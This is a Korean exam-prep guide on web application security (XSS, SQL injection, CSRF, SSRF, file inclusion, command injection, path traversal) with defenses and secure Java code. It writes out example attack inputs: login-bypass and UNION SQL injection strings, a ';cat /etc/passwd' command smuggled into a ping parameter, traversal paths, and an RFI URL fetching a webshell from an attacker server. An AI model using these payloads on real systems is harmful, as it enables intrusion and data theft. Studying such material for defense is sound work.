# 파트 2. 웹 보안

웹 보안은 정보보안기사 실기에서 가장 많이 출제되는 파트입니다. XSS, SQL Injection, CSRF는 매 회차 출제됩니다. 공격 원리부터 대응 코드까지 완벽히 이해해야 합니다.

## 1. XSS (Cross-Site Scripting)

> 출제 이유: 웹 취약점 중 가장 기초이자 빈출 주제. 3가지 유형의 차이를 명확히 서술해야 하며, 반드시 공격 원리와 함께 대응 방법도 암기해야 합니다.

### 1-1. XSS 정의

| 항목 | 내용 |
|---|---|
| 정의 | 공격자가 공격 대상 웹 사이트에 악성 스크립트(주로 JavaScript)를 삽입하여, 해당 사이트에 접근한 희생자의 브라우저에서 악성 스크립트가 실행되도록 하는 공격 |
| 피해 유형 | 세션 쿠키 탈취(세션 하이재킹) / 피싱 페이지 생성 / 키로거 삽입 / 악성 코드 배포 |
| 근본 원인 | 서버가 사용자 입력값을 검증 없이 HTML에 포함하여 응답 |

### 1-2. XSS 3가지 유형 (필수 암기)

| 유형 | 설명 / 특징 |
|---|---|
| Stored XSS (저장형) | 악성 스크립트를 서버 DB에 저장 → 피해자가 해당 게시물 조회 시 응답에 포함되어 실행. 지속적(Persistent) 공격. 게시판·댓글·프로필 등 이용 |
| Reflected XSS (반사형) | 악성 스크립트가 포함된 URL을 피해자가 클릭 → 서버가 URL 파라미터를 응답에 반사 → 피해자 브라우저에서 즉시 실행. 비지속적(Non-Persistent) 공격 |
| DOM-based XSS | 서버를 거치지 않고 클라이언트 측 JavaScript의 DOM 조작 과정에서 악성 스크립트 실행. 서버 측 필터링 우회 가능. 응답 소스에 스크립트가 나타나지 않아 탐지 어려움 |

!!! important "핵심"
    Stored=저장형=지속적, Reflected=반사형=비지속적, DOM=클라이언트 측 — 이 3가지 키워드를 각 유형에 연결하세요. 시험에서 빈칸 채우기 또는 유형 설명 서술 모두 출제됩니다.

### 1-3. XSS 대응 방법

- 입력값 검증: 사용자 입력에서 `<`, `>`, `'`, `"`, `&` 등 HTML 특수문자 필터링
- 출력값 인코딩 (HTML Entity Encoding): `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;` 등으로 변환하여 스크립트로 해석되지 않도록 함
- HttpOnly 쿠키 속성: JavaScript에서 쿠키 접근 불가 → XSS로 쿠키 탈취 방지
- Secure 쿠키 속성: HTTPS에서만 쿠키 전송
- CSP (Content Security Policy): 허용된 출처의 스크립트만 실행하도록 브라우저에 지시
- WAF(웹 방화벽) 적용: 악성 스크립트 패턴 탐지·차단

## 2. SQL Injection

> 출제 이유: 웹 공격 중 가장 치명적이며, 실무형 문제로 안전한 코드 직접 작성이 요구됩니다. PreparedStatement 패턴을 코드 수준으로 암기해야 합니다.

### 2-1. SQL Injection 정의 및 원리

| 항목 | 내용 |
|---|---|
| 정의 | 사용자 입력값이 SQL 쿼리에 직접 삽입될 때, 공격자가 SQL 구문을 조작하여 의도하지 않은 쿼리를 실행시키는 공격 |
| 인증 우회 예시 | `' OR '1'='1` — WHERE 조건을 항상 참으로 만들어 로그인 우회 |
| 정보 추출 예시 | `' UNION SELECT username, password FROM users --` — 다른 테이블 데이터 추출 |
| 피해 | 인증 우회 / 데이터 유출 / 데이터 변조·삭제 / 시스템 명령 실행 (xp_cmdshell 등) |

### 2-2. 취약한 코드 vs 안전한 코드 (24년도 4회, 25년도 4회)

**취약한 코드 (Statement 직접 연결)**

```java
String sql = "SELECT * FROM board WHERE b_gubun = '" + gubun + "'";
Statement stmt = con.createStatement();
ResultSet rs = stmt.executeQuery(sql);
// 문제: gubun에 ' OR '1'='1 삽입 시 모든 데이터 노출
```

**안전한 코드 (PreparedStatement 사용)**

```java
String sql = "SELECT * FROM board WHERE b_gubun = ?";      // (A) ?
PreparedStatement pstmt = con.prepareStatement(sql);         // (B)
pstmt.setString(1, gubun);                                   // (C)
ResultSet rs = pstmt.executeQuery();                         // (D)
// ? 플레이스홀더로 SQL과 데이터를 분리 → 입력값이 순수 데이터로만 처리됨
```

**핵심 포인트**: (A) = `?` (플레이스홀더) / (B) = `con.prepareStatement(sql);` / (C) = `pstmt.setString` / (D) = `pstmt.executeQuery();`

### 2-3. SQL Injection 유형

| 유형 | 설명 |
|---|---|
| 기본 SQL Injection | WHERE 조건 조작으로 인증 우회 또는 데이터 추출 |
| Union-based SQL Injection | UNION 구문으로 다른 테이블 데이터 추출 |
| Blind SQL Injection | 오류 메시지 없이 참/거짓 응답 차이를 이용하여 데이터 추출 |
| Error-based SQL Injection | 의도적 오류 메시지에 데이터를 포함시켜 추출 |
| Time-based Blind SQL Injection | SLEEP() 함수로 응답 지연 여부로 데이터 추론 |
| Form SQL Injection | HTML Form 기반 인증을 담당하는 애플리케이션의 취약점을 이용해, 질의문의 조건절(WHERE절)이 항상 참이 되도록 사용자 인증 질의문의 조건을 임의로 조작하여 인증을 우회하는 기법. 공격이 성공하면 반환되는 레코드 셋의 첫 번째 레코드에 해당하는 사용자 권한을 획득 |

**데이터베이스별 주석 처리 문자 (SQL Injection 실무 핵심)**

공격 대상 DB마다 주석 처리 문자가 다르므로 공격 수행 시 대상 DBMS에 맞는 주석 문자를 사용해야 합니다.

| DBMS | 여러 줄 주석 | 한 줄 주석 | 예시 |
|---|---|---|---|
| MySQL | `/* 주석 */` | `#` 주석 | `select * from member where id='' or 1=1#' and pass='1234'` |
| MS-SQL | `/* 주석 */` | `--` 주석 | `select * from member where id='' or 1=1--' and pass='1234'` |
| Oracle | `/* 주석 */` | `--` 주석 | `select * from member where id='' or 1=1--' and pass='1234'` |

!!! important "핵심"
    `' or 1=1#`(MySQL) 또는 `' or 1=1--`(MS-SQL·Oracle) — WHERE절을 항상 참으로 만드는 `' or 1=1`은 공통이지만, 뒤에 오는 나머지 질의문(비밀번호 조건 등)을 무력화하는 **주석 문자는 DB마다 다르다**는 점이 실무형 문제의 핵심 포인트입니다.

**SQL Injection 공격 시 자주 쓰이는 URL 인코딩(Percent Encoding)**

| 문자 | 16진수 | 문자 | 16진수 |
|---|---|---|---|
| `<` `=` `>` | 0x3C, 0x3D, 0x3E | `#` | 0x23 |
| `'` `"` | 0x27, 0x22 | `-` | 0x2D |
| space(공백) | 0x20 (또는 `+`) | `;` | 0x3B |
| `,` | 0x2C | NULL 문자 | 0x00 |

**무료 SQL Injection 취약점 스캐너**: Nikto(웹서버 및 SQL Injection 취약점 점검, 리눅스 기반) / SQLMap(블라인드 SQL Injection 자동 수행, Python 개발) / Absinthe(GUI 기반, 블라인드 SQL Injection 취약점을 이용해 DB 스키마·목록을 자동화 다운로드)

### 2-4. SQL Injection 대응 방법

- Prepared Statement(매개변수화 쿼리) 사용 — 가장 효과적
- 저장 프로시저(Stored Procedure) 사용
- 입력값 화이트리스트 검증: 허용된 문자만 입력 허용
- 입력값 특수문자 이스케이프 처리 (`'`, `--`, `;` 등 필터링)
- DB 계정 권한 최소화: 읽기 전용 계정, 필요한 테이블만 접근 허용
- 오류 메시지 차단: DB 오류 정보가 사용자에게 노출되지 않도록 설정

## 3. CSRF (Cross-Site Request Forgery)

> 출제 이유: XSS와 자주 비교 출제됩니다. CSRF 토큰 방어 원리를 코드 수준으로 이해해야 합니다.

### 3-1. CSRF 정의

| 항목 | 내용 |
|---|---|
| 정의 | 인증된 사용자가 자신의 의지와 무관하게 공격자가 의도한 행위(설정 변경, 데이터 수정 등)를 서버에 요청하게 만드는 공격 |
| XSS와 차이 | XSS: 스크립트를 실행시켜 공격자가 원하는 행위 수행. CSRF: 정상 사용자의 권한으로 의도치 않은 요청 전송 |
| 공격 조건 | 사용자가 공격 대상 사이트에 로그인 상태 유지 + 공격자의 악성 링크 클릭 |
| 피해 예시 | 관리자 패스워드 변경, 게시물 무단 작성, 금융 이체 등 |
| 관련 기출 | 26년도 1회 — CSRF 토큰 코드 분석 |

### 3-2. CSRF 대응 방법 (26년도 1회)

- **CSRF 토큰 사용 (가장 효과적)**: 서비스 요청 전 단계에서 난수 토큰을 매번 새롭게 생성하여 세션에 저장 → 요청 시 포함된 토큰과 세션 저장 토큰을 비교하여 정상 경로 요청 검증
- 입력 폼에 GET 대신 POST 방식 사용
- Referer 헤더 검증: 요청의 출처를 검증하여 외부에서의 비정상 요청 차단
- 중요 기능에 대해 세션 검증 외 재인증 요구
- SameSite 쿠키 속성 설정: 외부 사이트 요청 시 쿠키 전송 제한

### 3-3. CSRF 토큰 코드 예시 (26년도 1회)

```java
@RequestMapping("/write.do")
public String boardWrite(@ModelAttribute BoardModel boardModel, HttpSession session) {
    // 난수 형태의 토큰을 생성하여 세션에 저장
    session.setAttribute("SESSION_CSRF_TOKEN", UUID.randomUUID().toString());
    return "/board/write";
}
// 생성한 토큰을 작업(입력) 페이지에 히든 필드의 값으로 전달
```

### 3-4. 세션 vs 쿠키

| 구분 | 쿠키 (Cookie) | 세션 (Session) |
|---|---|---|
| 저장 위치 | 클라이언트(브라우저) | 서버 |
| 보안성 | 클라이언트 해킹·스니핑에 취약 | 상대적으로 안전 |
| 전달 방식 | HTTP 요청/응답 헤더에 포함 | 세션 ID만 쿠키로 전달, 실제 데이터는 서버 저장 |
| 유효 기간 | 설정된 만료 시간까지 유지 | 서버가 관리 (타임아웃 등) |

!!! tip "TIP"
    쿠키 보안 속성: HttpOnly(JS 접근 차단), Secure(HTTPS만 전송), SameSite(CSRF 방지) — 3가지 모두 암기하세요.

## 4. HTTP 관련 취약점

> 출제 이유: HTTP 프로토콜의 특성을 이용한 다양한 공격 기법이 매 회차 출제됩니다.

### 4-1. HTTP Request Smuggling (24년도 2회)

| 항목 | 내용 |
|---|---|
| 정의 | HTTP/1.1의 Content-Length와 Transfer-Encoding 헤더의 처리 방식 차이를 악용하여 Front-End와 Back-End 서버가 요청 경계를 다르게 해석하도록 유도하는 공격 |
| 공격 환경 | Front-End 서버(프록시/로드밸런서) + Back-End 서버로 구성된 다중 계층 웹 앱 |
| 피해 | Back-End 서버에 직접 변조된 요청 전송 / 중요 정보 획득 / XSS 공격 유도 / 다른 사용자 요청 가로채기 |

**대응 방법**

- Front-End와 Back-End 서버 간 HTTP/2 사용 (HTTP/2는 요청 경계가 명확)
- Transfer-Encoding 헤더와 Content-Length 헤더를 동시에 사용하는 요청 차단
- 웹 서버·프록시 소프트웨어를 최신 버전으로 업데이트

### 4-2. HTTP 응답 분할 (25년도 1회)

| 항목 | 내용 |
|---|---|
| 정의 | HTTP 응답 헤더에 CR(`\r`, `%0D`)과 LF(`\n`, `%0A`) 문자를 삽입하여 응답을 분리하고 조작된 HTTP 응답을 주입하는 공격 |
| 핵심 문자 | (A) CR = Carriage Return = `%0D` / (B) LF = Line Feed = `%0A` |
| 피해 | 캐시 포이즈닝, XSS, 피싱 페이지 삽입 |
| 대응 | 사용자 입력값에서 CR(`\r`), LF(`\n`) 문자 필터링 |

### 4-3. HTTP 메소드 보안

| 메소드 | 설명 / 보안 이슈 |
|---|---|
| GET | URL 파라미터로 데이터 전송 → 로그에 기록, 캐시에 저장 — 민감 데이터 전송 금지 |
| POST | HTTP Body로 데이터 전송 → GET보다 상대적으로 안전 |
| OPTIONS | 서버가 허용하는 HTTP 메소드 목록 반환 → 공격자 정보 수집에 악용 가능. 불필요 시 차단 권장 |
| PUT/DELETE | 서버 자원 생성·삭제 가능 → 인증 없이 허용 시 심각한 보안 위협. 기본 비활성화 권장 |
| TRACE/TRACK | 요청을 그대로 반환 → XST(Cross-Site Tracing) 공격에 악용 가능. 반드시 비활성화 |

## 5. SSRF (Server Side Request Forgery)

> 출제 이유: 클라우드 환경에서 매우 위험한 취약점으로 최근 출제 빈도가 높아지고 있습니다.

### 5-1. SSRF 정의 및 원리

| 항목 | 내용 |
|---|---|
| 정의 | 서버가 외부로 요청을 발생시키는 기능을 악용하여, 공격자가 검증되지 않은 입력값을 통해 서버로 하여금 내부 네트워크 자원이나 서비스에 접근하도록 강제하는 공격 |
| 공격 대상 | 내부 서버, 클라우드 메타데이터 서버(169.254.169.254), 내부 DB 등 |
| 피해 | 내부 서비스 정보 수집 / 인증 우회 / 내부 네트워크 스캔 / 민감 정보 탈취 |
| 관련 기출 | 25년도 1회, 24년도 1회 (SSRF 화이트/블랙리스트 필터링) |

### 5-2. SSRF 대응 방법 (24년도 1회)

- **화이트리스트(Whitelist) 방식 필터링**: 사용자 입력값을 다른 시스템 서비스 호출에 사용하는 경우, 허용된 도메인·IP 목록만 통과시킴 — 우선 적용
- **블랙리스트(Blacklist) 방식 필터링**: 무작위 입력값을 사용해야 할 경우, 위험한 도메인·IP·스킴(`file://`, `dict://` 등)을 차단 — 보조 적용
- 내부 네트워크 주소(RFC1918), 루프백 주소(127.0.0.1) 접근 차단
- URL 파싱 후 최종 도달 주소 검증 (리다이렉트 추적)

!!! important "CSRF 취약점과 SSRF 취약점의 차이 (필수 구분)"
    두 취약점 모두 "위조된 요청"을 이용하지만 **요청을 발생시키는 주체**가 다릅니다.

    - **CSRF**: 공격자가 정상적인 사용자의 요청 정보를 조작하여 웹사이트에서 사용자의 권한으로 악의적인 행위를 수행 — 조작된 요청 발생 주체는 **사용자(클라이언트)**
    - **SSRF**: 공격자가 요청 정보를 조작하여 웹서버가 내부 서버에 조작된 요청을 하도록 하여 정보 탈취 등을 수행 — 조작된 요청 발생 주체는 **웹서버(웹 애플리케이션)**

    SSRF는 2021년 OWASP Top 10에 신규 추가된 항목입니다.

## 6. 파일 계열 취약점 (업로드·다운로드·삽입) & OS Command Injection

> 출제 이유: 실무에서 매우 흔한 취약점으로 우회 기법과 공격 성공 조건이 상세히 출제됩니다.

### 6-1. 개요

| 항목 | 내용 |
|---|---|
| 정의 | 파일 업로드 시 파일 형식 검증이 미흡하여 웹쉘(WebShell)이나 악성 파일을 서버에 업로드하고 실행할 수 있는 취약점 |
| 웹쉘(WebShell) | 웹 서버에서 원격 명령을 실행할 수 있는 악성 스크립트 파일 (PHP, JSP, ASP 등) |

### 6-2. 우회 기법 (Content-Type 변조)

취약한 코드는 Content-Type(MIME 타입)만 검증하고 확장자 검증이 없습니다. 공격자는 웹쉘(예: `shell.php`) 업로드 시 HTTP 요청의 Content-Type 헤더를 `image/gif` 등 허용된 이미지 타입으로 변조합니다. → 서버는 이미지 파일로 인식하고 업로드 허용, 실제 파일은 PHP 웹쉘입니다.

### 6-3. 공격 성공 조건 2가지

1. 업로드된 파일을 외부에서 URL을 통해 직접 호출(접근) 가능해야 함
2. 업로드 디렉터리에서 서버 사이드 스크립트(`.php` 등)가 실행 권한을 가지고 있어야 함

### 6-4. 파일 업로드 보안 대책

- 파일 확장자 화이트리스트 검증: 허용된 확장자(.jpg, .png, .gif 등)만 업로드 허용
- Content-Type과 파일 내용(Magic Byte) 동시 검증
- 업로드 파일명 랜덤화: 원본 파일명 제거, UUID 등으로 변경
- 업로드 디렉터리의 스크립트 실행 권한 제거 (Apache: `Options -ExecCGI`)
- 업로드 디렉터리를 웹 루트 외부에 위치
- 파일 크기 제한

### 6-5. 파일 다운로드(File Download) 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 파일 다운로드 기능이 존재하는 웹 애플리케이션에서 파일 다운로드 시 파일 경로 및 파일명을 파라미터로 받아 처리하는 경우, 이를 적절히 필터링하지 않으면 공격자가 이를 조작(경로 및 파일명 조작)하여 허용되지 않은 파일(시스템 환경설정 파일, 소스 코드 파일, DB 연동 파일 등)을 다운받을 수 있는 취약점 |
| 실습 예시 | 다운로드 URL의 `real_name`(실제 저장된 파일명) 파라미터를 `../../../../etc/passwd`처럼 상대경로로 조작 |
| 경로 이동 문자 | 유닉스/리눅스: `../`(상위 디렉터리), `./`(현재 디렉터리) / 윈도우: `..\`(상위 디렉터리), `.\`(현재 디렉터리) |
| 대응 | 다운로드 대상 파일 경로를 화이트리스트로 관리(사용자 입력이 실제 파일 경로에 직접 반영되지 않도록 별도 매핑 테이블 사용) / 경로 조작 문자열(`../`, `..\`) 필터링 / 다운로드 대상 디렉터리를 제한 |

### 6-6. 파일 삽입(File Inclusion) 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 공격자가 악성 서버 스크립트를 서버에 전달하여, 해당 페이지를 통해 악성코드가 실행되도록 하는 취약점. PHP의 `include()`·`require()` 함수처럼 지정한 파일(페이지)을 현재 페이지에 포함해 실행시켜주는 함수에, 파일 경로를 외부로부터 입력받을 때 적절한 검증을 하지 않으면 발생 |
| 분류 | 삽입할 악성 스크립트 파일의 위치가 **로컬 서버**에 위치하는지, **원격지**에 위치하는지에 따라 LFI(Local File Inclusion)와 RFI(Remote File Inclusion)로 구분 |
| RFI 공격 예시 | 파라미터에 원격 웹쉘 URL을 전달(`?fname=http://공격자서버/webshell.php`)하여, include 함수가 원격 서버의 웹쉘 스크립트를 그대로 실행하도록 유도 |
| `include` vs `require` | `include`: 파일이 없어 오류가 발생해도 나머지 코드는 계속 실행 / `require`: 파일이 없어 오류가 발생하면 즉시 스크립트 실행 중단 |
| 대응 | 파일 경로를 외부 입력값으로 직접 구성하지 않고 화이트리스트(허용 목록)로 제한 / `allow_url_include`(PHP 설정) 비활성화로 RFI 원천 차단 |

### 6-7. 운영체제 명령 실행(OS Command Injection) 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 적절한 검증 절차를 거치지 않은 사용자 입력값이 운영체제 명령어의 일부 또는 전부로 구성되어 실행되는 경우, 의도하지 않은 시스템 명령어가 실행되어 부적절하게 권한이 변경되거나 시스템 동작·운영에 악영향을 미칠 수 있는 취약점. 소프트웨어 개발보안 가이드라인에서는 "운영체제 명령어 삽입(OS Command Injection)" 보안약점으로 정의 |
| 원리 | 웹 애플리케이션에서 `system()`, `exec()`와 같은 시스템 명령어를 실행할 수 있는 함수를 제공하며, 사용자 입력값에 대한 필터링이 제대로 이루어지지 않을 경우 공격자가 시스템 명령어를 호출 |
| 공격 예시 | ping 테스트 기능(`?ip=127.0.0.1`)에 세미콜론(`;`)으로 명령어를 추가 삽입 — `?ip=127.0.0.1;cat /etc/passwd` → ping 명령 뒤에 이어서 `cat /etc/passwd` 명령이 함께 실행되어 시스템 파일 유출 |
| 피해 | 시스템 계정 정보 유출, 백도어 설치, 관리자 권한 탈취 |
| 대응 | 사용자 입력값에서 `;`, `|`, `&`, `` ` `` 등 명령어 구분자·특수문자 필터링 / 시스템 명령어 실행 함수(system, exec 등) 사용 자제, 부득이한 경우 화이트리스트 기반 인자 검증 / 최소 권한으로 웹서버 프로세스 실행 |

## 7. 기타 웹 취약점

### 7-1. 디렉터리 리스팅 (Directory Listing)

| 항목 | 내용 |
|---|---|
| 정의 | 웹 서버 설정 오류로 디렉터리 내 파일 목록이 외부에 노출되는 취약점 |
| 위험성 | 서버 구조 파악, 숨겨진 파일 발견, 민감 파일(설정 파일, 백업 파일) 다운로드 |
| 조치 방법 | Apache: `Options` 지시자에서 `Indexes` 옵션 삭제 → `Options -Indexes` / IIS: 디렉터리 검색 기능 비활성화 |

### 7-2. HTTP 쿠키 보안 속성 (25년도 1회)

| 속성 | 설명 |
|---|---|
| HttpOnly | JavaScript에서 `document.cookie`로 쿠키 접근 불가. XSS 공격으로 쿠키 탈취 방지 |
| Secure | HTTPS 연결에서만 쿠키 전송. 스니핑으로 인한 쿠키 탈취 방지 |
| SameSite | 외부 사이트 요청 시 쿠키 전송 제한. CSRF 방지에 효과적 (Strict: 완전 차단, Lax: GET 허용, None: 모두 허용) |

### 7-3. ShellShock / 웹쉘 (25년도 2회)

| 항목 | 내용 |
|---|---|
| ShellShock | Bash 환경변수에 악성 코드를 삽입하여 원격 코드 실행이 가능한 취약점 (CVE-2014-6271). CGI 스크립트를 통해 웹에서 악용 가능 |
| 웹쉘(WebShell) | 웹 서버에 업로드된 악성 스크립트로 원격에서 시스템 명령 실행 가능. ShellShock으로 b.php 웹쉘 생성 공격이 기출에 등장 |
| 대응 | Bash를 취약하지 않은 버전으로 업데이트 / 웹쉘 업로드 차단 / 파일 무결성 모니터링 |

### 7-4. 경로 추적(Path Traversal) 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 웹서버와 웹 애플리케이션의 파일·디렉터리 접근이 통제되지 않아 웹서버(또는 웹 애플리케이션)의 중요한 파일과 데이터에 대한 접근·실행이 허용되는 취약점. Directory Traversal 취약점이라고도 함(경로 조작 취약점) |
| 원리 | 웹 애플리케이션의 루트 디렉터리를 벗어나 시스템의 주요 파일에 접근할 수 있는 취약점. 상대경로 참조방식(`../`, `..\`)이나 이를 인코딩한 문자를 사용해 다른 디렉터리에 있는 파일을 참조 |
| 예시 | `http://example.com/vul.php?fname=../../../../etc/passwd` |

**주요 경로 조작 문자 및 인코딩 방식**

| 표현 | `.`(dot) | `/`(slash) | `\`(back-slash) |
|---|---|---|---|
| 경로 조작 문자 | `..` | `/`(현재), `../`(상위) | `\`(현재), `..\`(상위, 윈도우) |
| URL 인코딩 | `.`(%2e) | `/`(%2f) | `\`(%5c) |
| 더블 URL 인코딩 | `.`(%252e) | `/`(%252f) | `\`(%255c) |
| 16bit 유니코드 인코딩 | `.`(%u002e) | `/`(%u2215) | `\`(%u2216) |

**대응**: 사용자 입력값에서 `../`, `..\` 등 상대경로 문자열 필터링 / 파일 접근 시 경로를 정규화(canonicalization)한 뒤 허용된 디렉터리 범위(화이트리스트) 내인지 검증 / 웹 서버 프로세스의 파일 접근 권한을 최소화

### 7-5. URL/파라미터 변조 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 실행경로에 대해서 접근제어를 검사하지 않거나 불완전하게 구현하여, 공격자가 URL·파라미터 값을 조작해 중요정보에 접근 가능해지는 취약점 |
| 범위 | 사용자 입력값에 대한 검증 누락이 발생하는 모든 상황을 포괄 — SQL Injection, 불충분한 인증 및 인가, XSS 공격에 활용될 수 있음 |
| 실습 예시 | 로그인한 사용자(kiwi11)의 정보수정 요청(POST) 중 `id=kiwi11` 파라미터를 웹 프록시로 가로채 `id=admin`으로 변조 → 관리자 정보에 접근 시도 |
| 대응 | 클라이언트가 아닌 **서버 측**에서 세션 기반으로 사용자 신원을 판단(파라미터 값을 신뢰하지 않음) / 모든 요청에 대해 서버 측 접근권한 재검증 |

### 7-6. 불충분한 세션 관리 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 웹 애플리케이션에서 사용자가 로그인할 때 매번 동일한 세션 ID(일정한 패턴이 존재)를 발급하거나, 세션 타임아웃을 너무 길게 설정했을 경우 공격자가 다른 사용자의 세션을 재사용하여 해당 사용자의 권한을 탈취할 수 있는 취약점 |
| 실습 예시 | 웹 프록시로 admin 로그인 시 세션 쿠키(PHPSESSID)를 획득 → 다른 브라우저에 해당 쿠키 값을 주입(Edit Cookie)하면 admin 세션을 그대로 가로채기 성공 → **HTTP 세션 하이재킹(Session Hijacking)** |
| 대응 | 세션 ID를 예측 불가능한 난수로 생성 / 적절한 세션 타임아웃 설정 / 로그인 성공 시 세션 ID 재발급(Session Fixation 방지) / HttpOnly·Secure 쿠키 속성 적용 |

### 7-7. 정보누출 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 웹 애플리케이션의 민감한 정보가 개발자의 부주의로 인해 노출되는 것. 중요정보(관리자 계정·테스트 계정 등)가 주석 구문에 포함되어 의도하지 않게 노출되거나, 에러 페이지·에러 메시지를 통해 불필요한 정보가 노출됨 |
| 위험성 | 정보누출 자체만으로 피해가 크지 않지만, 공격자가 공격 전 사전 정보를 수집하는 과정에서 공격의 실마리를 제공 |
| 사례 1 | 웹서버 디폴트 에러 페이지(예: Apache "Not Found" 404 페이지)를 그대로 사용할 경우 서버 소프트웨어·버전 정보 노출 |
| 사례 2 | 프로그램 실행 중 발생하는 Error·Warning 메시지를 그대로 출력할 경우 내부 파일 경로·DB 쿼리 등 시스템 정보 노출 |
| 대응 | 에러 페이지 커스터마이징(디폴트 에러 페이지 사용 금지) / 운영 환경에서 상세 에러 메시지 출력 비활성화 / 소스코드 주석에 민감정보 포함 금지 |

### 7-8. 관리자 페이지 노출 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 웹 애플리케이션의 전반적인 기능 설정 및 회원 관리를 할 수 있는 관리자 페이지가 추측할 수 있는 형태(예: `/admin`, `/manager`, `/webmaster`)로 구성되어 있으면, 공격자가 관리자 페이지에 쉽게 접근하고 무작위 대입 공격(Brute Force Attack)을 통해 관리자 권한을 획득할 수 있는 취약점 |
| 원칙 | 관리자 페이지는 가장 보호되어야 할 페이지로 매우 제한적으로 접근을 허용해야 함 |
| 대응 | 관리자 페이지 URL을 추측하기 어렵게 변경(예: `agsmgr.php`) / 사용자(관리자) 인증 강화 — 2 Factor 인증(2채널 인증, 예: ARS·SMS를 통한 세션키 추가 인증) / 관리자 페이지 접근 IP 화이트리스트 적용 |

### 7-9. 웹 로그 분석

| 항목 | 내용 |
|---|---|
| 개요 | 클라이언트가 웹서버에 접속하면 요청(Request)·응답(Response)이 지속적으로 발생. 클라이언트 요청 내용은 **액세스 로그(access log)**에, 웹서버 응답 중 오류가 발생하면 **에러 로그(error log)**에 기록됨 |
| 웹 로그 분석 목적 | 접속 사용자의 행위·취향 분석 / 보안사고 발생 시 추적할 수 있는 증거자료 / 보안사고 발생 전 이상 징후·해킹시도·해킹 성공 여부 확인 / 다양한 웹 공격 패턴 파악 / 접속 시간·경로·사용자 정보·요청 방식·성공여부 등 확인 |

**웹 로그 구조(웹 로그 종류)**

| 종류 | 설명 |
|---|---|
| NCSA CLF (Common Log Format) | Apache 및 Tomcat의 기본 로그 포맷 |
| NCSA ELF (Extended Log Format) | CLF에 Referer 값과 User-Agent 값이 추가로 포함된 포맷 |

### 7-10. 보안서버(Security Server) 구축

| 항목 | 내용 |
|---|---|
| 정의 | 인터넷상에서 정보를 암호화하여 송수신하는 기능이 구축된 웹서버. 독립적인 하드웨어를 별도로 설치하는 것이 아니라, **이미 사용하고 있는 웹서버에 SSL/TLS 인증서나 암호화 소프트웨어를 설치**하여 암호통신을 지원하는 것을 의미(= SSL/TLS 기반의 HTTPS 웹서버) |

**보안서버 구축의 필요성**

- 정보유출 방지(스니핑 방지): 사용자가 입력하는 중요정보(개인정보 등)에 대해 암호통신을 수행함으로써 외부 노출 위협 방지
- 위조/가짜 사이트 방지(피싱 방지): 공격자가 위조·가짜 사이트를 만들어 피싱을 시도하더라도 SSL/TLS 인증서가 진짜 사이트임을 증명하므로 사용자가 식별해 피해를 줄일 수 있음
- 기업 신뢰도 향상: 고객의 개인정보를 안전하게 관리한다는 가시적인 홍보 효과

**보안서버 구축의 법적 근거 — 개인정보 보호법 관련 「개인정보의 안전성 확보조치 기준」 제7조(개인정보의 암호화)**

- 개인정보처리자는 비밀번호, 생체인식정보 등 **인증정보**를 저장 또는 정보통신망을 통하여 송·수신하는 경우 이를 안전한 암호 알고리즘으로 암호화하여야 한다.
- 개인정보처리자는 **고유식별정보**를 정보통신망을 통하여 인터넷 구간으로 송·수신하는 경우에는 이를 안전한 암호 알고리즘으로 암호화하여야 한다.

!!! tip "암호화 대상 3가지"
    개인정보의 안전성 확보조치 기준 제7조에 따라 암호화해야 하는 핵심 대상은 **고유식별정보 / 비밀번호 / 생체인식정보**입니다("고/비/생"으로 암기).

### 7-11. 위치 공개(Location Disclosure) 취약점

| 항목 | 내용 |
|---|---|
| 정의 | 개발 과정 또는 소스코드를 수정하였을 경우 백업파일, 로그파일, 압축파일과 같은 파일이 자동적으로 생성되어 웹 애플리케이션 상에 노출될 경우, 공격자가 유추 후 직접 접근을 요청하여 해싱 정보를 획득할 수 있는 취약점(예: `source.tar.gz`처럼 개발 소스를 압축한 파일을 운영 서버에서 삭제하지 않아 외부에서 다운로드 가능) |
| 대응 | 웹서버에 테스트 파일과 같은 불필요한 파일 삭제, 서비스와 관련 없는 디렉터리(백업 디렉터리 등)는 일반 사용자 접근이 불가능하도록 접근제어 수행 |
| Apache 실무 설정 | `Files`·`FilesMatch` 지시자로 특정 확장자 파일에 대한 접근을 차단 — `<Files ~ "\.gz$">` / `<Files ~ "\.bak$">` 블록 안에서 `Order allow,deny` + `Deny from all` 설정. `FilesMatch`는 정규표현식을 사용한다는 의미 |

```apache
# .gz 파일에 대한 접근 차단
<Files ~ "\.gz$">
    Order allow,deny
    Deny from all
</Files>
# .bak 파일에 대한 접근 차단
<Files ~ "\.bak$">
    Order allow,deny
    Deny from all
</Files>
```

## 9. SW 보안약점 가이드 (소프트웨어 개발보안 가이드)

> 출제 이유: 행정안전부·KISA의 SW 보안약점 진단 가이드가 시험 출제 기준입니다. 3대 취약점 분류를 암기해야 합니다.

### 9-1. SW 보안약점 3대 유형 (24년도 4회)

| 유형 | 설명 |
|---|---|
| SQL Injection | SQL 쿼리 조작으로 DB 비인가 접근 |
| XSS (Cross Site Script) | 악성 스크립트 삽입으로 사용자 피해 |
| OS Command Injection (운영체제 명령어 삽입) | OS 명령어를 삽입하여 서버에서 원격 명령 실행 |

### 9-2. XML Injection (XPath/XQuery 인젝션) (24년도 2회)

| 항목 | 내용 |
|---|---|
| 정의 | XML 데이터 조회 시 XPath/XQuery 쿼리에 악성 구문을 삽입하는 공격 |
| 대응 3가지 | (A) 공통 검증: 입력값 유효성 검사 / (B) 필터링: 특수문자 및 XPath 메타문자 필터링 / (C) API 사용: 파라미터화된 XQuery API 사용 |

### 9-3. SW 보안약점 진단 분석 단계 산출물 4가지 (24년도 1회)

- 요구사항 정의서: 기능·품질·기술 요구사항을 체계적으로 작성한 문서
- 요구사항 추적표: 요구사항을 기반으로 각 개발 단계 산출물을 추적하는 문서
- 유즈케이스 명세서: 유즈케이스 다이어그램의 각 유즈케이스를 상세 설명하는 문서
- 유즈케이스 다이어그램: 사용자 관점에서 시스템의 기능을 정의한 다이어그램

## 10. 웹 보안 핵심 암기 표

| 주제 | 핵심 키워드 |
|---|---|
| XSS 3유형 | Stored(저장형·지속적) / Reflected(반사형·비지속적) / DOM(클라이언트 측) |
